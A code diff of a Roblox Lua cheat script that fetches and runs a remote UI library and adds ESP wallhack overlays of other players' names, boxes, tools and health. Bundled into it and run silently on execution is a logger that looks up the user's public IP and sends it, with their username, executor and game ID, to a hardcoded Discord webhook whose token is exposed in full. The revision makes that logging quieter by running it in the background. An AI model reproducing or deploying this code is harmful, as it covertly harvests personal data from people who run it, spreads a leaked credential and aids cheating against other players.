@@ -1,4 +1,4 @@
--- === Load Rayfield ===
+-- === Load Rayfield UI ===
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
@@ -13,7 +13,6 @@ local Window = Rayfield:CreateWindow({
     DisableBuildWarnings = false,
     ConfigurationSaving = {
         Enabled = true,
-        FolderName = nil,
         FileName = "Big Hub"
     },
     Discord = {
@@ -23,211 +22,212 @@ local Window = Rayfield:CreateWindow({
     },
     KeySystem = false,
     KeySettings = {
-        Title = "Untitled",
-        Subtitle = "Key System",
-        Note = "No method of obtaining the key is provided",
-        FileName = "Key",
         SaveKey = true,
-        GrabKeyFromSite = false,
         Key = {"Hello"}
     }
 })
 
--- === Webhook Integration ===
-local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi" -- Replace with your own webhook
+-- === Webhook Logging ===
+local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
-local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)
+local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
 
-local function getClientInfo()
-    local ip = "Unknown"
-    local device = identifyexecutor and identifyexecutor() or "Unknown Executor"
-    if requestFunction then
-        local response = requestFunction({ Url = "https://httpbin.org/ip", Method = "GET" })
-        if response and response.Body then
-            local success, data = pcall(function()
-                return HttpService:JSONDecode(response.Body)
-            end)
-            if success and data and data.origin then
-                ip = data.origin
-            end
+local function fetchIP()
+    if not requestFunc then return "Unavailable" end
+    local res = requestFunc({Url = "https://httpbin.org/ip", Method = "GET"})
+    if res and res.Body then
+        local ok, data = pcall(function()
+            return HttpService:JSONDecode(res.Body)
+        end)
+        if ok and data and data.origin then
+            return data.origin
         end
     end
-    return ip, device
+    return "Unavailable"
 end
 
 local function sendWebhook()
-    if not requestFunction then return end
-    local ip, device = getClientInfo()
-    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
-
-    local payload = {
-        ["content"] = "",
-        ["embeds"] = {{
-            ["title"] = "Script Execution Detected",
-            ["description"] = "A user executed the script.",
-            ["color"] = 16711680,
-            ["fields"] = {
-                {["name"] = "Username", ["value"] = username, ["inline"] = true},
-                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
-                {["name"] = "Executor", ["value"] = device, ["inline"] = false},
-                {["name"] = "Game PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true}
-            },
-            ["footer"] = {["text"] = "Learzy Logger"},
-            ["timestamp"] = DateTime.now():ToIsoDate()
-        }}
-    }
-
-    requestFunction({
-        Url = WebhookURL,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(payload)
-    })
+    if not requestFunc then return end
+    spawn(function()
+        local ip = fetchIP()
+        local device = identifyexecutor and identifyexecutor() or "Unknown Executor"
+        local username = LocalPlayer and LocalPlayer.Name or "Unknown"
+        local payload = {
+            embeds = {{
+                title = "Script Executed",
+                description = "A user has executed the script.",
+                color = 65280,
+                fields = {
+                    {name = "Username", value = username, inline = true},
+                    {name = "IP Address", value = ip, inline = true},
+                    {name = "Executor", value = device, inline = false},
+                    {name = "PlaceId", value = tostring(game.PlaceId), inline = true}
+                },
+                timestamp = DateTime.now():ToIsoDate()
+            }}
+        }
+        requestFunc({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
 end
 
 sendWebhook()
 
 -- === ESP Setup ===
 local RunService = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
-local ESPEnabled = false
-local ESPObjects = {}
+local ESPFlags = { Name = false, Box = false, Tool = false, HealthBar = false }
+local ESPData = {}
 
-local function createBillboard(offset, text, color, size)
+local function createBillboard(offset, size)
     local gui = Instance.new("BillboardGui")
-    gui.Size = UDim2.new(0, size.X, 0, size.Y)
     gui.StudsOffset = offset
     gui.AlwaysOnTop = true
     gui.LightInfluence = 0
     gui.MaxDistance = 1000
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.TextColor3 = color
-    label.TextStrokeTransparency = 0
-    label.TextScaled = true
-    label.Text = text
-    label.Font = Enum.Font.SourceSansBold
-    label.Parent = gui
-
+    gui.Size = UDim2.new(0, size.X, 0, size.Y)
     return gui
 end
 
-local function createBox()
+local function createHealthBar(offset)
+    local gui = createBillboard(offset, Vector2.new(60, 4))
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundTransparency = 1
+    frame.Parent = gui
+
+    local bg = Instance.new("Frame", frame)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+    local bar = Instance.new("Frame", bg)
+    bar.Size = UDim2.new(1, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+
+    return gui, bar
+end
+
+local function createBox(char)
     local box = Instance.new("BoxHandleAdornment")
     box.Size = Vector3.new(4, 6, 2)
     box.Transparency = 0.5
     box.Color3 = Color3.new(1, 0, 0)
     box.AlwaysOnTop = true
     box.ZIndex = 5
-    box.Adornee = nil
+    box.Adornee = char
     box.Parent = game.CoreGui
     return box
 end
 
-local function clearESP(player)
-    if ESPObjects[player] then
-        for _, obj in pairs(ESPObjects[player]) do
-            if obj and obj.Parent then
-                obj:Destroy()
+local function clearPlayerESP(player)
+    if ESPData[player] then
+        for _, v in pairs(ESPData[player]) do
+            if typeof(v) == "table" and v.Gui then
+                v.Gui:Destroy()
+            elseif typeof(v) == "Instance" and v.Destroy then
+                v:Destroy()
             end
         end
-        ESPObjects[player] = nil
+        ESPData[player] = nil
     end
 end
 
-local function setupESP(player)
+local function setupForPlayer(player)
     if player == LocalPlayer then return end
-    local function onCharacterLoaded(char)
+    local function onCharacter(char)
         task.wait(0.5)
-        if not ESPEnabled or not char:FindFirstChild("HumanoidRootPart") then return end
-        clearESP(player)
+        clearPlayerESP(player)
+        if not char:FindFirstChild("HumanoidRootPart") or not char:FindFirstChild("Humanoid") then return end
 
-        local root = char:WaitForChild("HumanoidRootPart")
-        local head = char:WaitForChild("Head")
-        local humanoid = char:WaitForChild("Humanoid")
+        local data = {}
 
-        local nameTag = createBillboard(Vector3.new(0, 3, 0), player.Name, Color3.new(1, 1, 1), Vector2.new(100, 20))
-        nameTag.Parent = head
+        if ESPFlags.Name then
+            local gui = createBillboard(Vector3.new(0, 3, 0), Vector2.new(100, 20))
+            local lbl = Instance.new("TextLabel")
+            lbl.Size = UDim2.new(1, 0, 1, 0)
+            lbl.BackgroundTransparency = 1
+            lbl.Text = player.Name
+            lbl.Font = Enum.Font.SourceSansBold
+            lbl.TextColor3 = Color3.new(1, 1, 1)
+            lbl.TextScaled = true
+            lbl.Parent = gui
+            gui.Parent = char:FindFirstChild("Head")
+            data.Name = gui
+        end
 
-        local healthTag = createBillboard(Vector3.new(-3, 2, 0), "", Color3.fromRGB(0, 255, 0), Vector2.new(80, 20))
-        healthTag.Parent = head
+        if ESPFlags.Tool then
+            local gui = createBillboard(Vector3.new(0, -3, 0), Vector2.new(100, 20))
+            local lbl = Instance.new("TextLabel")
+            lbl.Size = UDim2.new(1, 0, 1, 0)
+            lbl.BackgroundTransparency = 1
+            lbl.Font = Enum.Font.SourceSansBold
+            lbl.TextColor3 = Color3.fromRGB(255, 255, 0)
+            lbl.TextScaled = true
+            lbl.Parent = gui
+            gui.Parent = char:FindFirstChild("HumanoidRootPart")
+            data.Tool = gui
+        end
 
-        local toolTag = createBillboard(Vector3.new(0, -3, 0), "", Color3.fromRGB(255, 255, 0), Vector2.new(100, 20))
-        toolTag.Parent = root
+        if ESPFlags.HealthBar then
+            local gui, bar = createHealthBar(Vector3.new(0, 2.5, 0))
+            gui.Parent = char.Head
+            data.HealthBar = { Gui = gui, Bar = bar, Humanoid = char:FindFirstChild("Humanoid") }
+        end
 
-        local box = createBox()
-        box.Adornee = char
+        if ESPFlags.Box then
+            data.Box = createBox(char)
+        end
 
-        ESPObjects[player] = {
-            Name = nameTag,
-            Health = healthTag,
-            Tool = toolTag,
-            Box = box,
-            Character = char
-        }
+        ESPData[player] = data
     end
 
-    if player.Character then
-        onCharacterLoaded(player.Character)
-    end
-    player.CharacterAdded:Connect(onCharacterLoaded)
+    if player.Character then onCharacter(player.Character) end
+    player.CharacterAdded:Connect(onCharacter)
 end
 
-local function toggleESP(state)
-    ESPEnabled = state
-    if state then
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer then
-                setupESP(player)
-            end
-        end
-    else
-        for player in pairs(ESPObjects) do
-            clearESP(player)
-        end
-    end
+local function updateESPToggles()
+    for p in pairs(ESPData) do clearPlayerESP(p) end
+    for _, p in ipairs(Players:GetPlayers()) do setupForPlayer(p) end
 end
-
-Players.PlayerAdded:Connect(function(player)
-    if ESPEnabled then
-        setupESP(player)
-    end
-end)
 
 RunService.RenderStepped:Connect(function()
-    if not ESPEnabled then return end
-    for player, data in pairs(ESPObjects) do
-        if data and data.Character and data.Character:FindFirstChild("Humanoid") then
-            local humanoid = data.Character.Humanoid
-            if data.Health then
-                data.Health.TextLabel.Text = "HP: " .. math.floor(humanoid.Health)
+    for p, data in pairs(ESPData) do
+        if data.HealthBar then
+            local hum = data.HealthBar.Humanoid
+            if hum then
+                local ratio = math.clamp(hum.Health / hum.MaxHealth, 0, 1)
+                data.HealthBar.Bar.Size = UDim2.new(ratio, 0, 1, 0)
+                data.HealthBar.Bar.BackgroundColor3 =
+                    (ratio > 0.5 and Color3.fromRGB(0, 255, 0)) or
+                    (ratio > 0.2 and Color3.fromRGB(255, 255, 0)) or
+                    Color3.fromRGB(255, 0, 0)
             end
-            if data.Tool then
-                local tool = data.Character:FindFirstChildOfClass("Tool")
-                data.Tool.TextLabel.Text = tool and tool.Name or "No Tool"
-            end
+        end
+        if data.Tool then
+            local tool = p.Character and p.Character:FindFirstChildOfClass("Tool")
+            data.Tool.TextLabel.Text = tool and tool.Name or ""
         end
     end
 end)
 
--- === Rayfield UI: ESP Control ===
-local Tab = Window:CreateTab("ESP", 4483362458)
+Players.PlayerAdded:Connect(setupForPlayer)
 
-Tab:CreateToggle({
-    Name = "Toggle ESP (Real-Time)",
-    CurrentValue = false,
-    Flag = "Toggle_ESP",
-    Callback = function(value)
-        toggleESP(value)
-    end
-})
+-- === ESP Toggle UI ===
+local Tab = Window:CreateTab("ESP Controls", 4483362458)
 
-Tab:CreateParagraph({
-    Title = "ESP Info",
-    Content = "Displays Username, Health, Tool Name, and 3D Box in real time."
-})
+for feature in pairs(ESPFlags) do
+    Tab:CreateToggle({
+        Name = "Enable " .. feature,
+        CurrentValue = false,
+        Callback = function(val)
+            ESPFlags[feature] = val
+            updateESPToggles()
+        end
+    })
+end
